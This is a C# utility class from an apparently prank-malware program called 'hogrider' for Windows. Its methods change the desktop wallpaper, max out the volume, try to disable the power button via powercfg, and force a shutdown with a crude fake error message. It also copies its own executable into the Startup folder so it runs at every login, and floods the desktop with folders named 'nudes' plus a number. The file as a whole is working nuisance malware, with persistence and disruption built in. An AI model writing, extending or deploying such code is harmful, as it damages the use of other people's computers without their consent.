using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Globalization;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using AudioSwitcher.AudioApi.CoreAudio;
using System.Reflection;

namespace hogrider
{
    public class Utils
    {

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern Int32 SystemParametersInfo(
        UInt32 action, UInt32 uParam, String vParam, UInt32 winIni);

        private static readonly UInt32 SPI_SETDESKWALLPAPER = 0x14;
        private static readonly UInt32 SPIF_UPDATEINIFILE = 0x01;
        private static readonly UInt32 SPIF_SENDWININICHANGE = 0x02;

        public static void SetWallpaper(String path)
        {
            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path,
                SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
        }

        public static void OpenUrl(string url)
        {
            Process.Start(new ProcessStartInfo { FileName = @url, UseShellExecute = true });
        }

        public static void ChangeVolume() {
            CoreAudioDevice defaultPlaybackDevice = new CoreAudioController().DefaultPlaybackDevice;
            defaultPlaybackDevice.Volume = 100;
        }

        public static void OpenFile(string directory, string fileName) {
            var p = new Process();
            p.StartInfo = new ProcessStartInfo(directory + fileName)
            {
                UseShellExecute = true
            };
            p.Start();
        }

        public static void MessageBoxError(string message, string title)
        {
            MessageBox.Show(null, message, title, MessageBoxButtons.OK, MessageBoxIcon.Error);
        }

        public static void RemovePowerButton()
        {
            System.Diagnostics.Process.Start("cmd.exe", "powercfg -setacvalueindex SCHEME_CURRENT 4f971e89-eebd-4455-a8de-9e59040e7347 7648efa3-dd9c-4e3e-b566-50f929386280 0");
        }

        public static void ShutDown()
        {
            var psi = new ProcessStartInfo("shutdown", "/s /t 5 /c 'CRITICAL ERROR: Your ass got glued!'");
            psi.CreateNoWindow = true;
            psi.UseShellExecute = false;
            Process.Start(psi);
        }

        public static void AddStartup()
        {
            if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\hogrider.exe"))
            {
                Console.WriteLine("File already exists, skipping ...");
            } else
            {
                File.Copy(AppDomain.CurrentDomain.BaseDirectory + "hogrider.exe", Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\hogrider.exe");
            }
        }

        public static void DirsOnDesktop(int count) {
            for (int i = 0; i < count; i++)
            {
                string newFolder = "nudes" + i;

                string path = System.IO.Path.Combine(
                   Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
                   newFolder
                );

                Directory.CreateDirectory(path);
            }
        }
    }
}
